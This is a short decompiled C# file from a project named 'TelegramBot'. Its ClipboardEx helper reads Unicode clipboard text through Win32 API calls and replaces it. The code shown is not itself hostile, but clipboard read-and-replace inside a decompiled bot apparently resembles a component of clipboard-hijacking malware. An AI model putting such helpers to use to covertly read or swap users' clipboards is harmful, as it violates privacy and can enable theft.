using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace TelegramBot
{
	// Token: 0x02000006 RID: 6
	internal static class ClipboardEx
	{
		// Token: 0x06000015 RID: 21 RVA: 0x00003754 File Offset: 0x00001954
		public static string GetText()
		{
			if (!DLLImport.IsClipboardFormatAvailable(13U))
			{
				return null;
			}
			if (!DLLImport.OpenClipboard(IntPtr.Zero))
			{
				return null;
			}
			string result = null;
			IntPtr clipboardData = DLLImport.GetClipboardData(13U);
			if (!clipboardData.Equals(IntPtr.Zero))
			{
				IntPtr intPtr = DLLImport.GlobalLock(clipboardData);
				if (!intPtr.Equals(IntPtr.Zero))
				{
					try
					{
						result = Marshal.PtrToStringUni(intPtr);
						DLLImport.GlobalUnlock(intPtr);
					}
					catch
					{
					}
				}
			}
			DLLImport.CloseClipboard();
			return result;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000037DC File Offset: 0x000019DC
		public static void SetText(string text)
		{
			try
			{
				if (!string.IsNullOrEmpty(text))
				{
					DLLImport.GetOpenClipboardWindow();
					DLLImport.OpenClipboard(IntPtr.Zero);
					DLLImport.CloseClipboard();
					Clipboard.SetText(text);
				}
			}
			catch
			{
				Clipboard.SetText(text);
			}
		}

		// Token: 0x04000005 RID: 5
		public const uint CF_UNICODETEXT = 13U;

		// Token: 0x04000006 RID: 6
		public static string UNICODETEXT = "msgfhwgfd";
	}
}
